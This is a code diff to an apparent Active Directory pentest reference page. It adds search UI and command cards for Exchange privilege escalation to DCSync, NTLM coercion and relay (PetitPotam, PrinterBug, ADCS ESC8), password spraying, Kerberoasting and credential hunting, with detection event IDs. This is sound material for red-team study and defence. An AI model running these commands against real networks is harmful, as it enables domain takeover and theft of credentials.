@@ -88,17 +88,15 @@ body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSy
 #clear-btn{width:100%;margin-top:10px;padding:6px;background:transparent;border:1px solid var(--border);color:var(--text2);border-radius:6px;cursor:pointer;font-size:12px}
 #clear-btn:hover{border-color:var(--red);color:var(--red)}
 #main{flex:1;padding:20px;overflow-y:auto;min-width:0}
-#search{width:100%;background:var(--bg2);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:6px;font-size:14px;margin-bottom:10px;outline:none;transition:border-color .15s}
-.tab-toolbar{display:flex;align-items:center;gap:8px;margin-bottom:12px;flex-wrap:wrap}
+.tab-toolbar{display:flex;align-items:center;gap:8px;margin-bottom:8px;flex-wrap:wrap}
 .tab-toolbar input{flex:1;min-width:180px;background:var(--bg2);border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:6px;font-size:13px;outline:none;font-family:inherit;transition:border-color .15s}
 .tab-toolbar input:focus{border-color:var(--blue)}
 .tab-toolbar input::placeholder{color:#484f58}
 .tab-toolbar-count{font-size:11px;color:var(--text2);white-space:nowrap}
+mark.hl{background:#4d1a1a;color:#ffb3b3;border-radius:2px;padding:0 2px}
 .tab-nav-btn{background:var(--bg3);border:1px solid var(--border);color:var(--text2);padding:5px 11px;border-radius:5px;cursor:pointer;font-size:11px;font-weight:600;transition:all .15s;white-space:nowrap}
 .tab-nav-btn:hover{border-color:var(--blue);color:var(--text)}
-#search:focus{border-color:var(--blue)}
-#search::placeholder{color:var(--text2)}
-#count{font-size:12px;color:var(--text2);margin-bottom:14px;display:block}
+#count{font-size:11px;color:var(--text2);margin-bottom:10px;display:block}
 #cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(400px,1fr));gap:10px;align-items:start}
 .card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;overflow:hidden;transition:border-color .15s}
 .card:hover{border-color:#484f58}
@@ -267,7 +265,11 @@ body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSy
 
   <!-- Techniques view -->
   <div id="cards-section">
-    <input type="search" id="search" placeholder="Search techniques, commands, tools, protocols..." autocomplete="off">
+    <div class="tab-toolbar">
+      <input type="search" id="search" placeholder="Search techniques, commands, tools, protocols..." autocomplete="off">
+      <button class="tab-nav-btn" onclick="techExpandAll()">Expand All</button>
+      <button class="tab-nav-btn" onclick="techCollapseAll()">Collapse All</button>
+    </div>
     <span id="count"></span>
     <div id="cards"></div>
   </div>
@@ -1758,6 +1760,233 @@ body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSy
           <tr><td>Survives krbtgt reset?</td><td>No (after 2nd reset)</td><td>Yes (service account not reset)</td><td>No (after 2nd reset)</td></tr>
         </table>
 
+      </div>
+    </div>
+
+    <!-- Exchange Attacks -->
+    <div class="ref-card" id="rc-exchange">
+      <div class="ref-hdr" onclick="toggleRef('rc-exchange')">
+        <span class="ref-icon">&#128140;</span>
+        <span class="ref-title">Exchange Attacks — WriteDACL Path, PrivExchange, Relay</span>
+        <span class="ref-chev">&#9660;</span>
+      </div>
+      <div class="ref-body">
+
+        <p style="font-size:12px;color:var(--text2);margin:8px 0 12px">Exchange is one of the most reliable paths to Domain Admin in enterprise environments. By default, the <strong>Exchange Windows Permissions</strong> group has <code class="ic">WriteDACL</code> on the domain object — meaning any user in that group can grant themselves DCSync rights in seconds. Exchange servers themselves also have elevated AD privileges that can be abused via authentication coercion.</p>
+
+        <div class="ref-sub">Find Exchange servers</div>
+        <table class="ref-tbl">
+          <tr><th>Command</th><th>What it finds</th></tr>
+          <tr><td><code class="ic">nmap -p 25,443,587,993 &lt;SUBNET&gt;/24 --open -T4</code></td><td>SMTP + HTTPS — Exchange fingerprint</td></tr>
+          <tr><td><code class="ic">nxc smb &lt;SUBNET&gt;/24 -u &lt;USER&gt; -p &lt;PASS&gt; --gen-relay-list relay.txt</code> then look for Exchange hostnames</td><td>Exchange servers often appear as EXCHANGE*, MAIL*</td></tr>
+          <tr><td><code class="ic">Get-DomainComputer -Filter {ServicePrincipalName -like "*exchange*"} -Properties Name,ServicePrincipalName</code></td><td>Exchange servers via SPN in AD (PowerView)</td></tr>
+          <tr><td><code class="ic">nxc ldap &lt;DC-IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt; -M find-computers --options FILTER=exchange</code></td><td>Exchange hosts via LDAP</td></tr>
+        </table>
+
+        <div class="ref-sub">Path 1 — Exchange Windows Permissions → WriteDACL → DCSync</div>
+        <table class="ref-tbl">
+          <tr><th>Step</th><th>Command</th></tr>
+          <tr><td>1. Check if your account or a compromised account is in EWP</td><td><code class="ic">Get-DomainGroupMember "Exchange Windows Permissions" -Recurse</code><br>Also check: <code class="ic">Get-DomainGroupMember "Organization Management"</code></td></tr>
+          <tr><td>2. Grant DCSync rights to your account using that membership</td><td><code class="ic">$cred = Get-Credential  # use EWP member creds</code><br><code class="ic">Add-DomainObjectAcl -Credential $cred -TargetIdentity "&lt;DOMAIN&gt;" -Rights DCSync -PrincipalIdentity "&lt;YOUR-USER&gt;"</code></td></tr>
+          <tr><td>2. From Linux (ntlmrelayx --escalate-user)</td><td><code class="ic">ntlmrelayx.py -t ldap://&lt;DC-IP&gt; --escalate-user &lt;YOUR-USER&gt; --no-smb-server --no-http-server</code> then coerce an EWP member to auth to you</td></tr>
+          <tr><td>3. DCSync after rights granted</td><td><code class="ic">secretsdump.py '&lt;DOMAIN&gt;/&lt;YOUR-USER&gt;:&lt;PASS&gt;@&lt;DC-IP&gt;'</code></td></tr>
+          <tr><td>Cleanup</td><td><code class="ic">Remove-DomainObjectAcl -TargetIdentity "&lt;DOMAIN&gt;" -Rights DCSync -PrincipalIdentity "&lt;YOUR-USER&gt;"</code></td></tr>
+        </table>
+
+        <div class="ref-sub">Path 2 — PrivExchange (coerce Exchange server → relay to LDAP)</div>
+        <table class="ref-tbl">
+          <tr><th>Step</th><th>Command</th></tr>
+          <tr><td>Prerequisite</td><td>Valid domain user with a mailbox. Exchange server must not be patched against PrivExchange (CVE-2019-0686). Exchange has SYSTEM-level AD trust — relaying its auth gives you near-DA LDAP rights.</td></tr>
+          <tr><td>1. Start relay — escalate your user via LDAP</td><td><code class="ic">ntlmrelayx.py -t ldap://&lt;DC-IP&gt; --escalate-user &lt;YOUR-USER&gt; --no-smb-server --no-http-server</code></td></tr>
+          <tr><td>2. Trigger Exchange to auth to attacker</td><td><code class="ic">python3 privexchange.py -ah &lt;ATTACKER-IP&gt; &lt;EXCHANGE-IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt; -d &lt;DOMAIN&gt;</code></td></tr>
+          <tr><td>3. ntlmrelayx grants DCSync — then dump</td><td><code class="ic">secretsdump.py '&lt;DOMAIN&gt;/&lt;YOUR-USER&gt;:&lt;PASS&gt;@&lt;DC-IP&gt;'</code></td></tr>
+        </table>
+
+        <div class="ref-sub">Path 3 — OWA / EWS password spray</div>
+        <table class="ref-tbl">
+          <tr><th>Command</th><th>Notes</th></tr>
+          <tr><td><code class="ic">python3 ruler.py --domain &lt;DOMAIN&gt; --brute --users users.txt --passwords passwords.txt --stop-on-success</code></td><td>ruler — Exchange spray via MAPI/EWS. Slower but doesn't hit Kerberos/LDAP lockout counters.</td></tr>
+          <tr><td><code class="ic">python3 MailSniper.py -function PasswordSpray -ExchHostname &lt;EXCHANGE-IP&gt; -UserList users.txt -Password 'Password123!'</code></td><td>MailSniper PowerShell tool — also enumerates mailboxes post-compromise</td></tr>
+          <tr><td><code class="ic">curl -sk -u '&lt;DOMAIN&gt;\&lt;USER&gt;:&lt;PASS&gt;' https://&lt;EXCHANGE-IP&gt;/EWS/Exchange.asmx -o /dev/null -w "%{http_code}\n"</code></td><td>Manual single-account test — 200 = valid creds</td></tr>
+        </table>
+
+        <div class="ref-sub" style="color:#56d364">&#128065; Detection &amp; Event IDs</div>
+        <table class="ref-tbl">
+          <tr><th>Event / Indicator</th><th>Triggered by</th><th>Defender sees</th></tr>
+          <tr><td>Event <strong>4662</strong> — DS-Replication-Get-Changes-All</td><td>DCSync after WriteDACL grant</td><td>Non-DC account performing directory replication — critical IOC</td></tr>
+          <tr><td>Event <strong>5136</strong> — Directory Service Object Modified</td><td>ACL modification on domain object (WriteDACL step)</td><td>nTSecurityDescriptor changed on domain root — very suspicious</td></tr>
+          <tr><td>Exchange push notification to non-Exchange host</td><td>PrivExchange triggering</td><td>Exchange server making outbound HTTP to a workstation IP — anomalous</td></tr>
+          <tr><td>OWA/EWS auth failures spike</td><td>Password spray</td><td>Many 401s from a single source against Exchange HTTPS — spray pattern</td></tr>
+        </table>
+
+      </div>
+    </div>
+
+    <!-- Coercion Methods -->
+    <div class="ref-card" id="rc-coercion">
+      <div class="ref-hdr" onclick="toggleRef('rc-coercion')">
+        <span class="ref-icon">&#128247;</span>
+        <span class="ref-title">Authentication Coercion — All Methods Consolidated</span>
+        <span class="ref-chev">&#9660;</span>
+      </div>
+      <div class="ref-body">
+
+        <p style="font-size:12px;color:var(--text2);margin:8px 0 12px">Coercion forces a Windows machine — typically a DC or Exchange server — to authenticate to an attacker-controlled host. The resulting NTLM auth is either relayed (to LDAP/ADCS for immediate DA) or captured for cracking. Combined with ADCS ESC8 or LDAP relay this is often the fastest path to DA from valid credentials.</p>
+
+        <div class="ref-sub">All Coercion Methods</div>
+        <table class="ref-tbl">
+          <tr><th>Name</th><th>Protocol</th><th>Auth required</th><th>Condition on target</th><th>Tool</th></tr>
+          <tr><td><span class="edge-n">MS-RPRN (PrinterBug)</span></td><td>RPC</td><td>Valid domain creds</td><td>Print Spooler service running (default on most servers + DCs)</td><td><code class="ic">impacket-printerbug '&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;TARGET&gt;' &lt;ATTACKER-IP&gt;</code></td></tr>
+          <tr><td><span class="edge-n">MS-EFSRPC (PetitPotam)</span></td><td>RPC</td><td>None (unpatched) / domain creds (patched)</td><td>EFS service — enabled by default. Patch KB5005413 requires auth.</td><td><code class="ic">python3 PetitPotam.py [-u user -p pass] &lt;ATTACKER-IP&gt; &lt;TARGET-IP&gt;</code></td></tr>
+          <tr><td><span class="edge-n">MS-DFSNM (DFSCoerce)</span></td><td>RPC</td><td>Valid domain creds</td><td>DFS Namespace role installed (common on file servers and some DCs)</td><td><code class="ic">python3 DFSCoerce.py -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; &lt;ATTACKER-IP&gt; &lt;TARGET-IP&gt;</code></td></tr>
+          <tr><td><span class="edge-n">MS-FSRVP (ShadowCoerce)</span></td><td>RPC</td><td>Valid domain creds</td><td>VSS / File Server VSS Agent service running</td><td><code class="ic">python3 ShadowCoerce.py -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; &lt;ATTACKER-IP&gt; &lt;TARGET-IP&gt;</code></td></tr>
+          <tr><td><span class="edge-n">MS-RPRN via Coercer</span></td><td>RPC (multi)</td><td>Valid domain creds</td><td>Tries MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP automatically</td><td><code class="ic">python3 Coercer.py coerce -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -l &lt;ATTACKER-IP&gt; -t &lt;TARGET-IP&gt;</code></td></tr>
+          <tr><td><span class="edge-n">WebDAV (HTTP coercion)</span></td><td>HTTP</td><td>Valid domain creds</td><td>WebClient service running on target (default on workstations, not servers)</td><td><code class="ic">python3 Coercer.py coerce ... --always-continue</code> with <code class="ic">-l http://&lt;ATTACKER&gt;/</code> — forces HTTP auth instead of SMB</td></tr>
+        </table>
+
+        <div class="ref-sub">Check which methods will work before coercing</div>
+        <table class="ref-tbl">
+          <tr><th>Check</th><th>Command</th></tr>
+          <tr><td>Print Spooler running?</td><td><code class="ic">nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p &lt;PASS&gt; -M spooler</code></td></tr>
+          <tr><td>WebClient running? (enables WebDAV coercion)</td><td><code class="ic">nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p &lt;PASS&gt; -M webdav</code></td></tr>
+          <tr><td>Coercer scan mode (no coercion, just checks)</td><td><code class="ic">python3 Coercer.py scan -u &lt;USER&gt; -p &lt;PASS&gt; -d &lt;DOMAIN&gt; -t &lt;TARGET-IP&gt;</code></td></tr>
+        </table>
+
+        <div class="ref-sub">Coercion → Relay → DA: combined setups</div>
+        <table class="ref-tbl">
+          <tr><th>Goal</th><th>Relay target</th><th>Setup</th></tr>
+          <tr><td>Full domain via ADCS ESC8</td><td><code class="ic">http://&lt;ADCS-IP&gt;/certsrv/certfnsh.asp</code></td><td><code class="ic">ntlmrelayx.py -t http://&lt;ADCS-IP&gt;/certsrv/certfnsh.asp --adcs --template DomainController -smb2support</code> → coerce DC → get DC cert → <code class="ic">certipy auth</code> → DCSync</td></tr>
+          <tr><td>Grant DCSync rights to your user</td><td><code class="ic">ldap://&lt;DC-IP&gt;</code> (unsigned) or <code class="ic">ldaps://&lt;DC-IP&gt;</code></td><td><code class="ic">ntlmrelayx.py -t ldap://&lt;DC-IP&gt; --escalate-user &lt;YOUR-USER&gt; --no-smb-server</code> → coerce any privileged machine → rights granted → DCSync</td></tr>
+          <tr><td>Dump SAM on relay targets</td><td><code class="ic">smb://&lt;TARGET&gt;</code> (signing disabled)</td><td><code class="ic">ntlmrelayx.py -tf relay_targets.txt -smb2support</code> → coerce → SAM dumped on all signing-disabled hosts simultaneously</td></tr>
+          <tr><td>Capture hash for cracking (no relay)</td><td>Attacker SMB share</td><td><code class="ic">sudo responder -I eth0</code> → coerce → NTLMv2 captured in <code class="ic">/usr/share/responder/logs/</code> → <code class="ic">hashcat -m 5600</code></td></tr>
+        </table>
+
+        <div class="ref-sub" style="color:#56d364">&#128065; Detection &amp; Event IDs</div>
+        <table class="ref-tbl">
+          <tr><th>Event / Indicator</th><th>Triggered by</th><th>Defender sees</th></tr>
+          <tr><td>Event <strong>4648</strong> on coerced host</td><td>All coercion methods — machine account authenticating to unexpected host</td><td>DC$ or EXCHANGE$ making outbound NTLM auth to a workstation IP — almost never legitimate</td></tr>
+          <tr><td>Sysmon Event <strong>3</strong> — network connection</td><td>RPC coercion initiating outbound connection</td><td>lsass.exe / spoolsv.exe / efssvc.exe making TCP connections to unexpected hosts</td></tr>
+          <tr><td>Network — SMB/HTTP from DC to workstation</td><td>Relay receiving the auth</td><td>Domain controller initiating SMB (445) or HTTP (80/443) to a non-server IP</td></tr>
+          <tr><td>Event <strong>7036</strong> — service state change</td><td>Print Spooler disabled post-engagement as mitigation</td><td>Useful as a baseline: if Spooler is running on DCs, it's a standing risk</td></tr>
+          <tr><td>Mitigation: disable Print Spooler on DCs</td><td>Prevention</td><td><code class="ic">Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled</code></td></tr>
+        </table>
+
+      </div>
+    </div>
+
+    <!-- Quick Wins Checklist -->
+    <div class="ref-card" id="rc-quickwins">
+      <div class="ref-hdr" onclick="toggleRef('rc-quickwins')">
+        <span class="ref-icon">&#9889;</span>
+        <span class="ref-title">First-Creds Quick Wins — Run These the Moment You Have Domain Creds</span>
+        <span class="ref-chev">&#9660;</span>
+      </div>
+      <div class="ref-body">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin:10px 0 8px">
+          <span style="font-size:11px;color:var(--text2)" id="qw-prog"></span>
+          <button onclick="qwReset()" style="background:transparent;border:1px solid var(--border);color:var(--text2);padding:3px 10px;border-radius:4px;cursor:pointer;font-size:11px">Reset</button>
+        </div>
+        <table class="ref-tbl">
+          <tr><th style="width:22px"></th><th>Action</th><th>Command hint</th><th>What you get</th></tr>
+
+          <tr class="mc-cat"><td colspan="4">&#9193; Immediate — First 2 Minutes</td></tr>
+          <tr class="qw-row" data-qwid="01" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">Validate creds + sweep for local admin</td>
+            <td><code class="ic">nxc smb &lt;SUBNET&gt;/24 -u &lt;USER&gt; -p &lt;PASS&gt; --continue-on-success</code></td>
+            <td>Which machines you own immediately. (Pwn3d!) = local admin.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="02" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">Check WinRM + RDP access</td>
+            <td><code class="ic">nxc winrm &lt;SUBNET&gt;/24 -u &lt;USER&gt; -p &lt;PASS&gt;</code></td>
+            <td>Interactive shell targets without needing local admin everywhere.</td>
+          </tr>
+
+          <tr class="mc-cat"><td colspan="4">&#128202; Enumeration — Run All in Parallel</td></tr>
+          <tr class="qw-row" data-qwid="03" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">BloodHound collect</td>
+            <td><code class="ic">bloodhound-python -u &lt;USER&gt; -p &lt;PASS&gt; -d &lt;DOMAIN&gt; -dc &lt;DC-IP&gt; -c All</code></td>
+            <td>Full attack graph — shortest path to DA, owned principals, ACL abuse paths.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="04" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">Kerberoast — request all SPN tickets</td>
+            <td><code class="ic">GetUserSPNs.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt; -dc-ip &lt;DC-IP&gt; -request -outputfile spns.txt</code></td>
+            <td>Service account hashes. Crack with <code class="ic">hashcat -m 13100</code>.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="05" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">AS-REP roast — no-preauth accounts</td>
+            <td><code class="ic">GetNPUsers.py &lt;DOMAIN&gt;/ -usersfile users.txt -no-pass -dc-ip &lt;DC-IP&gt; -format hashcat</code></td>
+            <td>User hashes without needing their password. Crack with <code class="ic">hashcat -m 18200</code>.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="06" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">Password in description field</td>
+            <td><code class="ic">nxc ldap &lt;DC-IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt; -M get-desc-users</code></td>
+            <td>Plaintext passwords left by admins in user description — critical severity finding.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="07" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">Domain trust mapping</td>
+            <td><code class="ic">Get-DomainTrustMapping</code> or <code class="ic">impacket-findDelegation '&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;' -dc-ip &lt;DC-IP&gt;</code></td>
+            <td>Other domains you may be able to reach + delegation chains.</td>
+          </tr>
+
+          <tr class="mc-cat"><td colspan="4">&#128165; High-Value Checks</td></tr>
+          <tr class="qw-row" data-qwid="08" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">ADCS vulnerability scan</td>
+            <td><code class="ic">certipy find -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &lt;PASS&gt; -dc-ip &lt;DC-IP&gt; -vulnerable -stdout</code></td>
+            <td>ESC1/ESC4/ESC6/ESC8 — any hit = direct path to DA via certificate.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="09" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">Delegation scan</td>
+            <td><code class="ic">impacket-findDelegation '&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;' -dc-ip &lt;DC-IP&gt;</code></td>
+            <td>Unconstrained hosts (coerce + steal TGT) and constrained/RBCD accounts.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="10" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">LAPS + gMSA read access</td>
+            <td><code class="ic">nxc smb &lt;DC-IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt; -M laps</code> and <code class="ic">nxc ldap &lt;DC-IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt; --gmsa</code></td>
+            <td>Local admin passwords or managed service account NT hashes — direct PTH.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="11" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">SMB signing scan → relay targets</td>
+            <td><code class="ic">nxc smb &lt;SUBNET&gt;/24 --gen-relay-list relay_targets.txt</code></td>
+            <td>Hosts where NTLM relay will work. Save now — needed for every relay attack.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="12" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">Print Spooler + coercion check</td>
+            <td><code class="ic">nxc smb &lt;SUBNET&gt;/24 -u &lt;USER&gt; -p &lt;PASS&gt; -M spooler</code></td>
+            <td>Spooler running on DC = coerce → relay → DA (combine with ADCS ESC8 or LDAP relay).</td>
+          </tr>
+
+          <tr class="mc-cat"><td colspan="4">&#128270; Extended Enumeration</td></tr>
+          <tr class="qw-row" data-qwid="13" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">MSSQL instance discovery</td>
+            <td><code class="ic">nxc mssql &lt;SUBNET&gt;/24 -u &lt;USER&gt; -p &lt;PASS&gt; -d &lt;DOMAIN&gt;</code></td>
+            <td>(Pwn3d!) = sysadmin → xp_cmdshell → SYSTEM. Otherwise check impersonation + linked servers.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="14" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">SMB share spider — hunt for creds in files</td>
+            <td><code class="ic">nxc smb &lt;SUBNET&gt;/24 -u &lt;USER&gt; -p &lt;PASS&gt; -M spider_plus --options DOWNLOAD_FLAG=True</code></td>
+            <td>web.config, .xml, .ini, scripts with hardcoded credentials. Often finds svc account passwords.</td>
+          </tr>
+          <tr class="qw-row" data-qwid="15" onclick="qwToggle(this)">
+            <td><span class="mc-cb">&#10003;</span></td>
+            <td class="mc-name">Exchange server — check WriteDACL path</td>
+            <td><code class="ic">Get-DomainGroupMember "Exchange Windows Permissions" -Recurse</code></td>
+            <td>Any user member of this group can grant themselves DCSync. Immediate escalation path.</td>
+          </tr>
+        </table>
       </div>
     </div>
 
@@ -4628,7 +4857,8 @@ function applyFilters(){
     const matchSearch = !q || card.dataset.text.includes(q);
     const show = haveMatch && otherMatch && matchSearch;
     card.style.display = show ? '' : 'none';
-    if(show) vis++;
+    if(show){ vis++; if(q.length >= 2) card.classList.add('open'); }
+    else card.classList.remove('open');
   });
   const c = document.getElementById('count');
   c.textContent = `${vis} of ${D.length} techniques`;
@@ -4674,6 +4904,12 @@ document.querySelectorAll('.vtab').forEach(btn=>{
     document.getElementById('ref-view').style.display        = v==='ref'      ? 'block' : 'none';
     document.getElementById('playbook-view').style.display   = v==='playbook' ? 'block' : 'none';
     localStorage.setItem('ad_active_tab', v);
+    // Clear search state on tab change
+    _clearHighlights(document.body);
+    const rsEl = document.getElementById('ref-search');
+    const pbEl = document.getElementById('pb-search');
+    if(rsEl && rsEl.value){ rsEl.value=''; refSearch(''); }
+    if(pbEl && pbEl.value){ pbEl.value=''; pbSearch(''); }
   });
 });
 
@@ -4824,6 +5060,33 @@ function mcLoadState(){
   mcUpdateProgress();
 }
 
+function qwToggle(row){
+  row.classList.toggle('done');
+  const key = 'qw_'+row.dataset.qwid;
+  row.classList.contains('done') ? localStorage.setItem(key,'1') : localStorage.removeItem(key);
+  qwUpdateProgress();
+}
+function qwUpdateProgress(){
+  const total = document.querySelectorAll('.qw-row').length;
+  const done  = document.querySelectorAll('.qw-row.done').length;
+  const el = document.getElementById('qw-prog');
+  if(el) el.textContent = done+' / '+total+' checked';
+}
+function qwLoadState(){
+  document.querySelectorAll('.qw-row').forEach(row=>{
+    if(localStorage.getItem('qw_'+row.dataset.qwid)==='1') row.classList.add('done');
+  });
+  qwUpdateProgress();
+}
+function qwReset(){
+  if(!confirm('Reset quick wins checklist?')) return;
+  document.querySelectorAll('.qw-row').forEach(row=>{
+    row.classList.remove('done');
+    localStorage.removeItem('qw_'+row.dataset.qwid);
+  });
+  qwUpdateProgress();
+}
+
 function toggleCheck(el){
   el.classList.toggle('done');
   const key = 'ck_'+el.dataset.phase+'_'+el.dataset.idx;
@@ -4938,6 +5201,7 @@ document.getElementById('loot-copy-btn').addEventListener('click',()=>{
 renderFlow();
 loadLoot();
 mcLoadState();
+qwLoadState();
 
 document.getElementById('mc-reset-btn').addEventListener('click',()=>{
   if(!confirm('Reset all misconfiguration checks?')) return;
@@ -6134,8 +6398,30 @@ function pbCopy(btn){
 }
 
 // ── Reference tab search + nav ────────────────────────────────────────────────
+// ── Search highlight helpers ──────────────────────────────────────────────────
+function _clearHighlights(root){
+  (root||document).querySelectorAll('[data-hl-orig]').forEach(el=>{
+    el.innerHTML = el.getAttribute('data-hl-orig');
+    el.removeAttribute('data-hl-orig');
+  });
+}
+function _applyHighlights(container, q){
+  if(!q) return;
+  const escaped = q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
+  const re = new RegExp(escaped, 'gi');
+  if(!container.hasAttribute('data-hl-orig')){
+    container.setAttribute('data-hl-orig', container.innerHTML);
+  }
+  container.innerHTML = container.getAttribute('data-hl-orig').replace(
+    /(<[^>]*>)|([^<]+)/g,
+    (_,tag,text) => tag || text.replace(re, '<mark class="hl">$&</mark>')
+  );
+}
+
 function refSearch(q){
   q = q.toLowerCase().trim();
+  if(q.length === 1) q = '';
+  _clearHighlights(document.getElementById('ref-view'));
   const cards = document.querySelectorAll('#ref-view .ref-card');
   let vis = 0;
   cards.forEach(card=>{
@@ -6144,9 +6430,21 @@ function refSearch(q){
     if(match){ vis++; if(q) card.classList.add('open'); }
     else card.classList.remove('open');
   });
+  if(q){
+    document.querySelectorAll('#ref-view .ref-card').forEach(card=>{
+      if(card.style.display !== 'none') _applyHighlights(card, q);
+    });
+  }
   const el = document.getElementById('ref-count');
   if(el) el.textContent = q ? `${vis} of ${cards.length} sections` : '';
 }
+function techExpandAll(){
+  document.querySelectorAll('#cards .card').forEach(c=>c.classList.add('open'));
+}
+function techCollapseAll(){
+  document.querySelectorAll('#cards .card').forEach(c=>c.classList.remove('open'));
+}
+
 function refExpandAll(){
   document.querySelectorAll('#ref-view .ref-card').forEach(c=>c.classList.add('open'));
   localStorage.setItem('ad_ref_open',JSON.stringify([...document.querySelectorAll('#ref-view .ref-card')].map(c=>c.id)));
@@ -6159,6 +6457,8 @@ function refCollapseAll(){
 // ── Playbook search + nav ─────────────────────────────────────────────────────
 function pbSearch(q){
   q = q.toLowerCase().trim();
+  if(q.length === 1) q = '';
+  _clearHighlights(document.getElementById('playbook-view'));
   const phases = document.querySelectorAll('#playbook-phases .ph-card');
   let vis = 0;
   phases.forEach(card=>{
@@ -6167,6 +6467,11 @@ function pbSearch(q){
     if(match){ vis++; if(q) card.classList.add('open'); }
     else card.classList.remove('open');
   });
+  if(q){
+    document.querySelectorAll('#playbook-phases .ph-card').forEach(card=>{
+      if(card.style.display !== 'none') _applyHighlights(card, q);
+    });
+  }
   const el = document.getElementById('pb-count');
   if(el) el.textContent = q ? `${vis} of ${phases.length} phases` : '';
 }
